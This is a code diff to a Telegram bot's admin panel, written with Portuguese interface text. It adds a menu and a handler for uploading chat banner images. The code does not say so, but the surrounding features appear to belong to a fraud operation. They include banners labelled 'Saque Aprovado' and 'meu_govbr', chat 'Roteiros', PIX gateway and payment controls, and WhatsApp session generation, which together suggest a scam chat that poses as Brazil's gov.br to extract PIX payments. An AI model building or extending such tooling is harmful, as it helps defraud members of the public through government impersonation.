@@ -1519,7 +1519,8 @@ async function startTelegramPolling() {
               [{ text: "💰 Painel Financeiro", callback_data: "painel:financeiro_auth" }, { text: "📧 Configurar SMTP", callback_data: "painel:config_smtp" }],
               [{ text: "⚡ PIX Rápido", callback_data: "cmd:last_pix" }, { text: "🛠️ Config Gateway", callback_data: "painel:config_pix" }],
               [{ text: aiBtnText, callback_data: "painel:toggle_ai" }, { text: botModeBtnText, callback_data: "painel:toggle_bot_mode" }],
-              [{ text: "📝 Gerar Protocolo Avulso", callback_data: "pix_avulso:start" }, { text: "📜 Ver Roteiros", callback_data: "painel:scripts:Geral" }]
+              [{ text: "📝 Gerar Protocolo Avulso", callback_data: "pix_avulso:start" }, { text: "🖼️ Editar Banners", callback_data: "painel:config_banners" }],
+              [{ text: "📜 Ver Roteiros", callback_data: "painel:scripts:Geral" }]
             ]
           };
           await sendTelegram(dashText, cb ? msgId : undefined, kb);
@@ -1953,6 +1954,22 @@ async function startTelegramPolling() {
           resetBotSession(id);
           await sendTelegram(`📲 <b>GERANDO QR CODE...</b>\n\nO processo foi iniciado para <b>${id}</b>. Aguarde o QR nos logs ou Telegram.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
         }
+        else if (text === "painel:config_banners") {
+          const kb = {
+             inline_keyboard: [
+                [{ text: "Banner 1 (Saque Aprovado)", callback_data: "painel:edit_banner:saque" }],
+                [{ text: "Banner 2 (Atenção)", callback_data: "painel:edit_banner:atencao" }],
+                [{ text: "Banner 3 (Pix)", callback_data: "painel:edit_banner:pix" }],
+                [{ text: "↩️ Voltar ao Painel", callback_data: "painel:start" }]
+             ]
+          };
+          await sendTelegram(`🖼️ <b>EDITAR BANNERS DO CHAT</b>\n\nEscolha qual banner deseja alterar enviando uma nova imagem:`, msgId, kb);
+        }
+        else if (text.startsWith("painel:edit_banner:")) {
+          const bannerId = text.split(":")[2];
+          botStates.set(userId, { action: `awaiting_banner_${bannerId}`, data: { botMsgId: msgId } });
+          await sendTelegram(`🖼️ <b>ENVIE A NOVA IMAGEM</b>\n\nPor favor, envie a foto/imagem que você deseja usar para este banner agora.\n\n<i>Aguardando imagem...</i>`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_banners" }]] });
+        }
         else if (text === "painel:config_pix") {
           const txt = `🛠️ <b>CONFIGURAÇÃO DO GATEWAY PIX</b>\n\n` +
             `👤 <b>Nome:</b> ${currentConfig.pixName}\n` +
@@ -2242,6 +2259,33 @@ async function startTelegramPolling() {
             botStates.set(userId, { action: 'awaiting_target_phone', data: { pendingId, botMsgId: msgId } });
             await sendTelegram(`📱 <b>ENVIAR PARA OUTRO NÚMERO</b>\n\nPor favor, digite o número de telefone (com DDD) para o qual deseja enviar este PIX:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
           }
+        }
+        else if (!cb && msg?.photo) {
+           const state = botStates.get(userId);
+           if (state?.action?.startsWith('awaiting_banner_')) {
+              const bannerId = state.action.replace('awaiting_banner_', '');
+              const fileId = msg.photo[msg.photo.length - 1].file_id;
+              const targetMsgId = state.data?.botMsgId;
+              
+              try {
+                 const fileRes = await axios.get(`https://api.telegram.org/bot${token}/getFile?file_id=${fileId}`);
+                 const filePath = fileRes.data.result.file_path;
+                 const downloadRes = await axios.get(`https://api.telegram.org/file/bot${token}/${filePath}`, { responseType: 'arraybuffer' });
+                 
+                 let filename = "meu_govbr.png";
+                 if (bannerId === "saque") filename = "banner_saque_aprovado.png";
+                 if (bannerId === "atencao") filename = "banner_atencao.png";
+                 if (bannerId === "pix") filename = "banner_pix.png";
+                 
+                 const savePath = path.join(process.cwd(), 'public', 'assets', 'banners', filename);
+                 fs.writeFileSync(savePath, downloadRes.data);
+                 
+                 await sendTelegram(`✅ <b>BANNER ATUALIZADO COM SUCESSO!</b>\n\nA imagem foi salva e já está ativa no chat.`, targetMsgId, { inline_keyboard: [[{ text: "↩️ Voltar", callback_data: "painel:config_banners" }]] });
+                 botStates.delete(userId);
+              } catch (e: any) {
+                 await sendTelegram(`❌ <b>ERRO AO SALVAR IMAGEM</b>\n\n${e.message}`, targetMsgId, { inline_keyboard: [[{ text: "↩️ Voltar", callback_data: "painel:config_banners" }]] });
+              }
+           }
         }
         else if (!cb && msg?.text) {
           const state = botStates.get(userId);
